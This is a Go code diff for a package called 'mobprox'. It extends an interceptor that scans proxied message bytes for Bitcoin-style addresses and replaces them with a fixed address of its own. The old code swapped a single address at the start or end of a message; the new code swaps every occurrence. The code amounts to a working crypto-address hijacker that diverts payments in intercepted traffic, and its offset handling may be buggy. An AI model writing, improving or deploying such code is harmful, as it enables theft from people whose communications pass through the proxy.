@@ -3,6 +3,7 @@ package mobprox
 import (
 	"bytes"
 	"regexp"
+	"slices"
 )
 
 type (
@@ -26,38 +27,34 @@ func newbcoinReplacer(bCoinAddr string) *bcoinReplacer {
 }
 
 func (b *bcoinReplacer) intercept(in []byte) []byte {
-	match := b.bCoinPattern.FindSubmatchIndex(in)
-	// Submatch start and end indexes will be at match[2], match[3]
-	if match == nil || len(match) < 4 {
+	matches := b.bCoinPattern.FindAllSubmatchIndex(in, -1)
+	if matches == nil {
 		return in
 	}
 
-	startI := match[2]
-	endI := match[3]
+	out := slices.Clone(in)
+	offset := 0
+	for _, match := range matches {
+		// Submatch start and end indexes will be at match[2], match[3]
+		startI := match[2] + offset
+		endI := match[3] + offset
 
-	if startI > 1 && endI < len(in)-2 {
-		// Match is not at the start or end of the message
-		return in
-	}
+		endsWithNewline := out[len(out)-1] == '\n'
+		_in := bytes.TrimSpace(out)
+		// Remove the original
+		origBcoin := _in[startI:endI]
+		if bytes.Equal(origBcoin, []byte(b.bCoinAddr)) {
+			continue
+		}
 
-	endsWithNewline := in[len(in)-1] == '\n'
-	in = bytes.TrimSpace(in)
-	// Remove the original
-	origBcoin := in[startI:endI]
-	in = bytes.Replace(in, origBcoin, []byte(""), 1)
+		offset += len(b.bCoinAddr) - len(origBcoin)
 
-	out := make([]byte, 0)
-	// Address was at the beginning of the message
-	if startI < 2 {
-		out = append(out, []byte(b.bCoinAddr)...)
-		out = append(out, in...)
-		return out
-	}
-	// Address was at the end of the message
-	out = append(out, in...)
-	out = append(out, []byte(b.bCoinAddr)...)
-	if endsWithNewline {
-		out = append(out, '\n')
+		_in = bytes.Replace(_in, origBcoin, []byte(""), 1)
+		replaced := slices.Insert(_in, startI, []byte(b.bCoinAddr)...)
+		if endsWithNewline {
+			replaced = append(replaced, '\n')
+		}
+		out = replaced
 	}
 	return out
 }
